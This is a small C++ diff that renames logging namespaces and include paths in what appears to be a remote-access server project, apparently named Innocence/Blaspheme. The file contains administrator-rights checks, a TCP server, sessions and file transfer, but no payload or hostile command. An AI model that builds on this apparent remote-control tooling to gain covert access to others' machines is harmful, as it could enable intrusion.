@@ -24,9 +24,9 @@ int run(int argc, char ** argv)
 #ifdef INNOCENCE_DEBUG
 int main(int argc, char * argv[])
 {
-	LOG.setIdentity(Innocence::identity);
-	LOG.addObserver(new Common::LogToConsole);
-	LOG.addObserver(new Common::LogToCollector);
+	LOG.setIdentity(Common::identity);
+	LOG.addObserver(new Log::LogToConsole);
+	LOG.addObserver(new Log::LogToCollector);
 #ifdef _WIN32
 	System::Process::This thisProcess;
     if(!System::isAdministrator())
@@ -43,8 +43,8 @@ int main(int argc, char * argv[])
 #else
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    LOG.setIdentity(Innocence::identity);
-	LOG.addObserver(new Common::LogToCollector);
+    LOG.setIdentity(Common::identity);
+	LOG.addObserver(new Log::LogToCollector);
 
     // administrator rights are preferred to execute the Server
     System::Process::This thisProcess;
@@ -67,12 +67,12 @@ extern "C" void tss_cleanup_implemented(void){}
 using namespace std;
 
 #include <network/TcpServer.hpp>
-#include <common/Log.hpp>
+#include <log/Log.hpp>
 #include <common/Menu.hpp>
 #include <system/File.hpp>
 #include <system/Process.hpp>
 #include <blaspheme/protocol/Session.hpp>
-#include <Innocence.hpp>
+#include <common/Innocence.hpp>
 #include <blaspheme/transfer/FileTransfer.hpp>
 using namespace Common;
 using namespace Network;
